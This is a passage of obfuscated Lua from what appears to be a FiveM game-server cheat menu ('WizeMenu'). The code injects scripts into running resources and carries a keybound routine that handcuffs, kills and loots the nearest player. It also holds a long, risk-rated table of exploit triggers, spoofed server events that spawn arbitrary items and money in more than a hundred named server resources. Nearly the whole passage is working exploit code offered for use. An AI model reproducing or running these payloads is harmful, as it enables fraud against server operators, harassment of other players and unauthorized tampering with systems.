(GetResourceState(v417)=="started") then MachoInjectResource2(24 -(20 + 1) ,v417,([[
                        local function awt72q48dsgn()
                            local awgfh347gedhs = CreateThread
                            awgfh347gedhs(function()
                                local dict = 'missminuteman_1ig_2'
                                local anim = 'handsup_enter'

                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do
                                    Wait(0)
                                end

                                while true do
                                    Wait(0)
                                    if IsDisabledControlJustPressed(0, 38) then
                                        local selfPed = PlayerPedId()
                                        local selfCoords = GetEntityCoords(selfPed)
                                        local closestPlayer = -1
                                        local closestDistance = -1

                                        for _, player in ipairs(GetActivePlayers()) do
                                            local targetPed = GetPlayerPed(player)
                                            if targetPed ~= selfPed then
                                                local coords = GetEntityCoords(targetPed)
                                                local dist = #(selfCoords - coords)
                                                if closestDistance == -1 or dist < closestDistance then
                                                    closestDistance = dist
                                                    closestPlayer = player
                                                end
                                            end
                                        end

                                        if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                            local ped = GetPlayerPed(closestPlayer)

                                            local CEPressPlayer = SetEnableHandcuffs
                                            local CEDeadPlayerCheck = SetEntityHealth

                                            if not IsPedCuffed(ped) then
                                                CEPressPlayer(ped, true)
                                                CEDeadPlayerCheck(ped, 0)
                                                CEPressPlayer(ped, true)
                                            end

                                            if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                                TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                            end
                                            
                                            local ActiveInventory = "%s"
                                            local serverId = GetPlayerServerId(closestPlayer)
                                            if ActiveInventory == "ox" then
                                                TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
                                            elseif ActiveInventory == "qb" then
                                                TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                            end
                                        end
                                    end
                                end
                            end)
                        end

                        awt72q48dsgn()

                    ]]):format(v369));break;end end break;end if (v368==(0 + 0)) then v369=nil;v370={"ox_inventory","ox_doorlock","ox_fuel","ox_target","ox_lib","ox_sit","ox_appearance"};v368=1 + 0 ;end if (v368==1) then v371={ox="ox_inventory",qb="qb-inventory"};for v418,v419 in pairs(v371) do if (GetResourceState(v419)=="started") then v369=v418;break;end end v368=1174 -(786 + 386) ;end end else MachoInjectResource2(9 -6 ,v236.resource,v236.code);end break;end if (v235==(1379 -(1055 + 324))) then v236=v67[v66];if  not v236 then return;end v235=1341 -(1093 + 247) ;end end end);ItemNameHandle=MachoMenuInputbox(v46[1 + 0 ],"Name:","...");ItemAmountHandle=MachoMenuInputbox(v46[1 + 0 ],"Amount:","...");local v68={turn=3 -2 ,akIndex=3 -2 };local function v69(v237) MachoInjectResource("any",v237);end MachoMenuButton(v46[1],"Spawn Item",function() if  not v7() then return;end local v238=MachoMenuGetInputbox(ItemNameHandle);local v239=MachoMenuGetInputbox(ItemAmountHandle);if ( not v238 or (v238=="") or  not v239 or  not tonumber(v239)) then local v296=0;while true do if (0==v296) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");return;end end end local v240=tonumber(v239);local v241={{id="ak_item",name="Any Item Trigger (SAFE)",type="item",res={"ak47_whitewidowv2","ak47_cannabiscafev2","ak47_khusland","ak47_khusbites","ak47_leafnlatte","ak47_qb_cannabiscafev2","ak47_qb_leafnlatte","ak47_qb_khusland","ak47_qb_khusbites","ak47_qb_whitewidowv2"},all=false},{id="nails_money",name="Money Trigger (SAFE)",type="money",res={"codewave-nails-phone"},all=true},{id="handbag_money",name="Money Trigger (SAFE)",type="money",res={"codewave-handbag-phone"},all=true},{id="sneaker_money",name="Money Trigger (SAFE)",type="money",res={"codewave-sneaker-phone"},all=true},{id="caps_money",name="Money Trigger (SAFE)",type="money",res={"codewave-caps-client-phone"},all=true},{id="generic_money",name="Any Item Trigger (Medium Risk)",type="item",res={"ak47_qb_drugmanagerv2","ak47_drugmanagerv2"},all=false},{id="hotdog_money",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=true},{id="ak47_inventory",name="Any Item Trigger (SAFE)",type="item",res={"ak47_inventory","ak47_qb_inventory"},all=false},{id="shop_purchase",name="Palm Beach ANY ITEM (SAFE)",type="item_only",res={"PalmBeachMiamiMinimap"},all=true},{id="cl_pizzeria",name="Any Item Trigger (Medium Risk)",type="item",res={"CL-Pizzeria"},all=false},{id="solstice_moonshine",name="Any Item Trigger (Medium Risk)",type="item",res={"SolsticeMoonshineV2"},all=false},{id="tk_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"Tk_smokev2"},all=false},{id="ox_cb_ws_sellshop",name="Any Item Trigger (High Risk)",type="item",res={"__ox_cb_ws_sellshop"},all=false},{id="adminplus_selldrugs",name="Any Event Trigger (High Risk)",type="event",res={"adminplus-selldrugs"},all=false},{id="ak47_drugmanager",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanager"},all=false},{id="ak47_drugmanagerv2",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanagerv2"},all=false},{id="ak47_prospecting_reward",name="Give Scrap Items (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak47_prospecting_sell",name="Money Trigger (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak4y_fishing del",name="Any Item Trigger (Medium Risk)",type="item",res={"ak4y-advancedFishing"},all=false},{id="ak4y_case_opening",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-caseOpening"},all=false},{id="ak4y_playtime_shop",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-playTimeShop"},all=false},{id="angelicxs_civilian_payment",name="Money Trigger (SAFE)",type="money",res={"angelicxs-civilianjobs"},all=false},{id="angelicxs_civilian_item",name="Any Item Trigger (SAFE)",type="item",res={"angelicxs-civilianjobs"},all=false},{id="apex_cluckinbell",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_cluckinbell"},all=false},{id="apex_rexdiner",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_rexdiner"},all=false},{id="ars_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_hunting"},all=false},{id="ars_vvsgrillz",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsgrillz_v2"},all=false},{id="ars_vvsguns",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsguns"},all=false},{id="ars_vvsjewelry",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsjewelry"},all=false},{id="ars_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_whitewidow_v2"},all=false},{id="av_business",name="Any Item Trigger (Medium Risk)",type="item",res={"av_business"},all=false},{id="boii_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-drugs"},all=false},{id="boii_moneylaunderer",name="Money Trigger (Medium Risk)",type="money",res={"boii-moneylaunderer"},all=false},{id="boii_pawnshop",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-pawnshop"},all=false},{id="boii_salvage_diving",name="Any Event Trigger (Medium Risk)",type="event",res={"boii-salavagediving"},all=false},{id="boii_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"boii_whitewidow"},all=false},{id="brutal_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_hunting"},all=false},{id="brutal_shop_robbery",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_shop_robbery"},all=false},{id="cfx_tcd_starter",name="Any Event Trigger (Medium Risk)",type="event",res={"cfx-tcd-starterpack"},all=false},{id="core_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"core_crafting"},all=false},{id="d3mba_heroin",name="Any Item Trigger (Medium Risk)",type="item",res={"d3MBA-heroin"},all=false},{id="dcweedroll",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedroll"},all=false},{id="dcweedrollnew",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedrollnew"},all=false},{id="devcore_needs",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_needs"},all=false},{id="devcore_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_smokev2"},all=false},{id="dusa_pets",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa-pets"},all=false},{id="dusa_pet_shop",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa_pet"},all=false},{id="dv_donut_delivery",name="Money Trigger (Medium Risk)",type="money",res={"dv-donutdeliveryjob"},all=false},{id="esx_weashop",name="Any Item Trigger (Medium Risk)",type="item",res={"esx_weashop"},all=false},{id="ez_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"ez_lib"},all=false},{id="fivecode_camping",name="Any Item Trigger (Medium Risk)",type="item",res={"fivecode_camping"},all=false},{id="food_mechanics",name="Any Item Trigger (Medium Risk)",type="item",res={"food_mechanics"},all=false},{id="forge_starter",name="Any Item Trigger (Medium Risk)",type="item",res={"forge-starter"},all=false},{id="fs_placeables",name="Any Item Trigger (Medium Risk)",type="item",res={"fs_placeables"},all=false},{id="fuksus_shops",name="Any Item Trigger (Medium Risk)",type="item",res={"fuksus-shops"},all=false},{id="gardener_job",name="Money Trigger (Medium Risk)",type="money",res={"gardenerjob"},all=false},{id="guatau_consumibles",name="Any Item Trigger (Medium Risk)",type="item",res={"guataubaconsumibles"},all=false},{id="hg_wheel",name="Any Item Trigger (Medium Risk)",type="item",res={"hg-wheel"},all=false},{id="horizon_payment",name="Any Item Trigger (Medium Risk)",type="item",res={"horizon_paymentsystem"},all=false},{id="complete_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"hunting"},all=false},{id="inside_fruitpicker",name="Money Trigger (Medium Risk)",type="money",res={"inside-fruitpicker"},all=false},{id="inverse_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"inverse-consumables"},all=false},{id="it_lib",name="Any Item Trigger (SAFE)",type="item",res={"it-lib"},all=false},{id="jg_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jg-mechanic"},all=false},{id="jim_bakery",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-bakery"},all=false},{id="jim_beanmachine",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-beanmachine"},all=false},{id="jim_burgershot",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-burgershot"},all=false},{id="jim_catcafe",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-catcafe"},all=false},{id="jim_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-consumables"},all=false},{id="jim_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mechanic"},all=false},{id="jim_mining",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mining"},all=false},{id="jim_pizzathis",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-pizzathis"},all=false},{id="jim_recycle",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-recycle"},all=false},{id="jim_shops_blackmarket",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="jim_shops_open",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="kaves_drugsv2",name="Any Item Trigger (Medium Risk)",type="item",res={"kaves_drugsv2"},all=false},{id="mt_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"mt-restaurants"},all=false},{id="mt_printers",name="Any Item Trigger (Medium Risk)",type="item",res={"mt_printers"},all=false},{id="nx_cayo",name="Any Item Trigger (Medium Risk)",type="item",res={"nx-cayo"},all=false},{id="okok_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"okokCrafting"},all=false},{id="pug_business_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-businesscreator"},all=false},{id="pug_chopping",name="Money Trigger (Medium Risk)",type="money",res={"pug-chopping"},all=false},{id="pug_fishing",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-fishing"},all=false},{id="pug_robbery_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-robberycreator"},all=false},{id="qb_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-crafting"},all=false},{id="qb_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-drugs"},all=false},{id="qb_garbage_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-garbagejob"},all=false},{id="qb_hotdog_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=false},{id="qb_recycle_job",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-recyclejob"},all=false},{id="qb_trash_search",name="Money Trigger (Medium Risk)",type="money",res={"qb-trashsearch"},all=false},{id="qb_warehouse",name="Money Trigger (Medium Risk)",type="money",res={"qb-warehouse"},all=false},{id="rm_camperv",name="Any Item Trigger (Medium Risk)",type="item",res={"rm_camperv"},all=false},{id="ry_rent",name="Money Trigger (Medium Risk)",type="money",res={"ry_rent"},all=false},{id="savana_trucker",name="Money Trigger (Medium Risk)",type="money",res={"savana-truckerjob"},all=false},{id="sayer_jukebox",name="Any Item Trigger (Medium Risk)",type="item",res={"sayer-jukebox"},all=false},{id="sell_usb",name="Any Event Trigger (Medium Risk)",type="event",res={"sell_usb"},all=false},{id="snipe_boombox",name="Any Item Trigger (Medium Risk)",type="item",res={"snipe-boombox"},all=false},{id="solos_cashier",name="Money Trigger (Medium Risk)",type="money",res={"solos-cashier"},all=false},{id="solos_food",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-food"},all=false},{id="solos_hookah",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-hookah"},all=false},{id="solos_jointroll",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-jointroll"},all=false},{id="solos_joints",name="Any Item Trigger (High Risk)",type="item",res={"solos-joints"},all=false},{id="solos_methlab",name="Any Item Trigger (High Risk)",type="item",res={"solos-methlab"},all=false},{id="solos_moneywash",name="Any Item Trigger (High Risk)",type="item",res={"solos-moneywash"},all=false},{id="solos_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-restaurants"},all=false},{id="t1ger_gangsystem",name="Any Item Trigger (High Risk)",type="item",res={"t1ger_gangsystem"},all=false},{id="t1ger_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"t1ger_lib"},all=false},{id="xmmx_letscookplus",name="Any Item Trigger (Medium Risk)",type="item",res={"xmmx_letscookplus"},all=false},{id="zat_farming",name="Any Item Trigger (Medium Risk)",type="item",res={"zat-farming"},all=false},{id="zat_weed",name="Any Item Trigger (High Risk)",type="item",res={"zat-weed"},all=false}};local v242=false;for v267,v268 in ipairs(v241) do local v269=false;if v268.all then local v331=0;while true do if (v331==(0 -0)) then v269=true;for v398,v399 in ipairs(v268.res) do if  not v48(v399) then v269=false;break;end end break;end end else for v354,v355 in ipairs(v268.res) do if v48(v355) then v269=true;break;end end end if v269 then local v332=v238;local v333=v240;if ((v268.type=="money") or (v268.type=="event")) then v332="money";end if (v268.id=="ak_item") then for v379=v68.akIndex,( #v268.res + v68.akIndex) -1  do local v380=((v379-(1727 -(1165 + 561)))% #v268.res) + 1 ;local v381=v268.res[v380];if v48(v381) then v68.akIndex=(v380% #v268.res) + 1 + 0 ;local v407,v408,v409=table.unpack(GetEntityCoords(PlayerPedId()));local v410=([[Citizen.CreateThread(function() pcall(function() TriggerServerEvent(%q,%q,{['phone']=0},%d,0) end); DoScreenFadeOut(1);Citizen.Wait(1000);SetEntityCoordsNoOffset(PlayerPedId(),%f,%f,%f,false,false,false);Citizen.Wait(1000);DoScreenFadeIn(1000) end)]]):format(v381   .. ":process" ,v332,v333,v407,v408,v409);v69(v410);v242=true;break;end end elseif (v268.id=="nails_money") then local v400=0 -0 ;while true do if ((0 + 0)==v400) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardnails",%d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="handbag_money") then local v420=479 -(341 + 138) ;while true do if (v420==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardhandbags",%d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="sneaker_money") then local v439=0 -0 ;while true do if (0==v439) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardShoes",%d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="caps_money") then local v440=326 -(89 + 237) ;while true do if (v440==0) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardCaps",%d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="generic_money") then v69(("pcall(function() TriggerServerEvent('ak47_qb_drugmanagerv2:shop:buy', '53.15-1478.79', {['buyprice']=0, ['currency']='cash', ['name']='%s', ['sellprice']=0, ['label']='Katana MeNu On Top!!'}, %d) end)"):format(v332,v333));v242=true;elseif (v268.id=="hotdog_money") then v69(("pcall(function() local ped=GetPlayerPed(-1) local pedCoords=GetEntityCoords(ped) local HotdogsForSale=1 local SellingPrice=%d TriggerServerEvent('qb-hotdogjob:server:Sell', pedCoords, HotdogsForSale, SellingPrice) end)"):format(v333));v242=true;elseif (v268.id=="ak47_inventory") then local v441=0 -0 ;while true do if (v441==(0 -0)) then v69(([[TriggerServerEvent('ak47_inventory:buyItemDrag',{fromInv={identifier=nil,slot=1,slotData={amount=%d,close=true,count=999999999999999,description="CodePlug Found Ts Lol",info={account="cash",buyPrice=0},label="CodePlug Too Good Lol",name="%s",quality=100,slot=1,type="item",weight=0}},toInv={identifier=nil,slot=1,slotData={slot=1}}} )]]):format(v333,v332));v242=true;break;end end elseif (v268.id=="shop_purchase") then local v442=881 -(581 + 300) ;local v443;while true do if (v442==(1221 -(855 + 365))) then v242=true;break;end if (v442==(0 -0)) then v443="codeplug"   .. math.random(1000,32652 + 67347 ) ;v69(('pcall(function() TriggerServerEvent("shop:purchaseItem2", "%s", "%s", 0) end)'):format(v443,v332));v442=1;end end elseif (v268.id=="cl_pizzeria") then local v444=1235 -(1030 + 205) ;while true do if (v444==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("CL-Pizzeria:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="solstice_moonshine") then v69(('pcall(function() TriggerServerEvent("SolsticeMoonshineV2:server:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="tk_smokev2") then local v445=0 + 0 ;while true do if (v445==0) then v69(('pcall(function() TriggerServerEvent("Tk_smokev2:server:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ox_cb_ws_sellshop") then v69(('pcall(function() TriggerServerEvent("__ox_cb_ws_sellshop:sellItem", "sellshop", "ws_sellshop:sellItem:17692", { currency = "money", item = "%s", price = 9999999999, quantity = %d }) end)'):format(v332,v333));v242=true;elseif (v268.id=="adminplus_selldrugs") then local v446=286 -(156 + 130) ;while true do if (v446==(0 -0)) then v69(('pcall(function() TriggerEvent("stasiek_selldrugsv2:findClient",{ ["i"] = 8, ["label"] = "CodePlugFuckedUrCity", ["type"] = "CodePlugFuckedUrCity", ["zone"] = "The Meat Quarter", ["price"] = %d, ["count"] = 0 }) end)'):format(v333));v242=true;break;end end elseif (v268.id=="ak47_drugmanager") then local v447=0 -0 ;while true do if (v447==(0 -0)) then v69(('pcall(function() TriggerServerEvent("ak47_drugmanager:pickedupitem","%s","%s",%d) end)'):format(v332,v332,v333));v242=true;break;end end elseif (v268.id=="ak47_drugmanagerv2") then v69(('pcall(function() TriggerServerEvent("ak47_drugmanagerv2:shop:buy", "-1146.444941.22", { buyprice = 0, currency = "money", label = "codeplug", name = "%s", sellprice = 69696969 }, %d ) end)'):format(v332,v333));v242=true;elseif (v268.id=="ak47_prospecting_reward") then local v448=0 + 0 ;while true do if (v448==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("ak47_prospecting:reward", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="ak47_prospecting_sell") then local v449=69 -(10 + 59) ;while true do if (v449==0) then v69(('pcall(function() TriggerServerEvent("ak47_prospecting:sell","cash",%d,9999999999) end)'):format(v333));v242=true;break;end end elseif (v268.id=="ak4y_fishing") then local v450=0;while true do if (v450==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("ak4y-advancedFishing:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ak4y_case_opening") then v69(('pcall(function() TriggerServerEvent("ak4y-caseOpening:addGoldCoin", %d) end)'):format(v333));v242=true;elseif (v268.id=="ak4y_playtime_shop") then local v451=0 -0 ;while true do if (v451==0) then v69(('pcall(function() TriggerServerEvent("ak4y-playTimeShop:addCoin", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="angelicxs_civilian_payment") then v69(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:Payment", %d) end)'):format(v333));v242=true;elseif (v268.id=="angelicxs_civilian_item") then local v452=0;while true do if (v452==0) then v69(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="apex_cluckinbell") then local v453=1163 -(671 + 492) ;while true do if (v453==0) then v69(('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="apex_rexdiner") then local v454=0 + 0 ;while true do if (v454==(1215 -(369 + 846))) then v69(('pcall(function() TriggerServerEvent("apex_rexdiner:client:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ars_hunting") then local v455=0 + 0 ;while true do if (v455==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("ars_hunting:sellBuyItem", { item = "%s", price = 1, quantity = %d, buy = true }) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ars_vvsgrillz") then local v456=1945 -(1036 + 909) ;while true do if (v456==0) then v69(('pcall(function() TriggerServerEvent("ars_vvsgrillz_v2:Buyitem", "grillz", { items = {{ id = "%s", quantity = %d, price = 0, stock = 999999, totalPrice = 0 }}, method = "bank", total = 0 }, "bank") end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ars_vvsguns") then v69(('pcall(function() TriggerServerEvent("ars_vvsguns:Buyitem", "vvsguns", { items = { { id = "%s", image = "codeplug", name = "codeplug", page = 2, price = 0, quantity = %d, stock = 9999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v332,v333));v242=true;elseif (v268.id=="ars_vvsjewelry") then local v457=0 + 0 ;while true do if (v457==0) then v69(('pcall(function() TriggerServerEvent("ars_vvsjewelry:Buyitem", "vvsjewelry", { items = { { id = "%s", image = "CodePlug", name = "CodePlugRunsUrCity", page = 2, price = 0, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ars_whitewidow") then local v458=0;while true do if (v458==(0 -0)) then v69(('pcall(function() TriggerServerEvent("ars_whitewidow_v2:Buyitem", { items = { { id = "%s", image = "CodeFinder", name = "CodeFinder", page = 1, price = 500, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash") end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="av_business") then local v459=203 -(11 + 192) ;while true do if (v459==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("av_business:addItem", "%s", %d, 9999) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="boii_drugs") then local v460=175 -(135 + 40) ;while true do if ((0 -0)==v460) then v69(('pcall(function() TriggerServerEvent("boii-drugs:sv:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="boii_moneylaunderer") then local v461=0 + 0 ;while true do if (v461==0) then v69(('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:PayPlayer", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="boii_pawnshop") then local v462=0 -0 ;while true do if (v462==(0 -0)) then v69(('pcall(function() TriggerServerEvent("boii-pawnshop:sv:AddItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="boii_salvage_diving") then local v463=0;while true do if (v463==(176 -(50 + 126))) then v69('pcall(function() TriggerServerEvent("boii-salavagediving:server:JewelleryBag") end)');v242=true;break;end end elseif (v268.id=="boii_whitewidow") then local v464=0 -0 ;while true do if (v464==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("boii_whitewidow:server:itemadd", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="brutal_hunting") then local v465=1413 -(1233 + 180) ;while true do if (v465==(969 -(522 + 447))) then v69(('pcall(function() TriggerServerEvent("brutal_hunting:server:giveItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="brutal_shop_robbery") then local v466=1421 -(107 + 1314) ;while true do if (v466==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("brutal_shop_robbery:server:giveItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="cfx_tcd_starter") then local v467=0 -0 ;while true do if (v467==(0 + 0)) then v69('pcall(function() TriggerEvent("cfx-tcd-starterpack:client:openStarterPack") end)');v242=true;break;end end elseif (v268.id=="core_crafting") then v69(('pcall(function() TriggerServerEvent("core_crafting:giveItem", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="d3mba_heroin") then local v468=0 -0 ;while true do if (v468==(0 -0)) then v69(('pcall(function() TriggerServerEvent("d3MBA-heroin:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="dcweedroll") then v69(('pcall(function() TriggerServerEvent("dcweedroll:server:itemadd", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="dcweedrollnew") then v69(('pcall(function() TriggerServerEvent("dcweedrollnew:server:itemadd", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="devcore_needs") then v69(('pcall(function() TriggerServerEvent("devcore_needs:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="devcore_smokev2") then local v469=0;while true do if (v469==(1910 -(716 + 1194))) then v69(('pcall(function() TriggerServerEvent("devcore_smokev2:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="dusa_pets") then local v470=0 + 0 ;while true do if (v470==0) then v69(('pcall(function() TriggerServerEvent("dusa-pets:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="dusa_pet_shop") then local v471=0;while true do if (v471==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("dusa_pet:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="dv_donut_delivery") then local v472=0;while true do if (v472==(503 -(74 + 429))) then v69(('pcall(function() TriggerServerEvent("dv-donutdeliveryjob:server:giveReward", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="esx_weashop") then local v473=0 -0 ;while true do if (v473==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("esx_weashop:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="ez_lib") then local v474=0;while true do if (v474==(0 -0)) then v69(('pcall(function() TriggerServerEvent("ez_lib:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="fivecode_camping") then local v475=0 + 0 ;while true do if (v475==(0 -0)) then v69(('pcall(function() TriggerServerEvent("fivecode_camping:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="food_mechanics") then local v476=0;while true do if (v476==(0 -0)) then v69(('pcall(function() TriggerServerEvent("food_mechanics:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="forge_starter") then v69(('pcall(function() TriggerServerEvent("forge-starter:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="fs_placeables") then local v477=0;while true do if (v477==(433 -(279 + 154))) then v69(('pcall(function() TriggerServerEvent("fs_placeables:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="fuksus_shops") then local v478=0;while true do if (0==v478) then v69(('pcall(function() TriggerServerEvent("fuksus-shops:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="gardener_job") then local v479=0;while true do if (v479==(778 -(454 + 324))) then v69(('pcall(function() TriggerServerEvent("gardenerjob:server:giveReward", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="guatau_consumibles") then local v480=0;while true do if (v480==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("guataubaconsumibles:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="hg_wheel") then local v481=0;while true do if (v481==(17 -(12 + 5))) then v69(('pcall(function() TriggerServerEvent("hg-wheel:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="horizon_payment") then local v482=0 + 0 ;while true do if (v482==(0 -0)) then v69(('pcall(function() TriggerServerEvent("horizon_paymentsystem:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="complete_hunting") then v69(('pcall(function() TriggerServerEvent("hunting:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;elseif (v268.id=="inside_fruitpicker") then local v483=0 + 0 ;while true do if ((1093 -(277 + 816))==v483) then v69(('pcall(function() TriggerServerEvent("inside-fruitpicker:server:giveReward", %d) end)'):format(v333));v242=true;break;end end elseif (v268.id=="inverse_consumables") then local v484=0 -0 ;while true do if (v484==(1183 -(1058 + 125))) then v69(('pcall(function() TriggerServerEvent("inverse-consumables:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="it_lib") then local v485=0;while true do if (v485==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("it_lib:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif (v268.id=="jg_mechanic") then local v486=0;while true do if ((975 -(815 + 160))==v486) then v69(('pcall(function() TriggerServerEvent("jg-mechanic:server:addItem", "%s", %d) end)'):format(v332,v333));v242=true;break;end end elseif 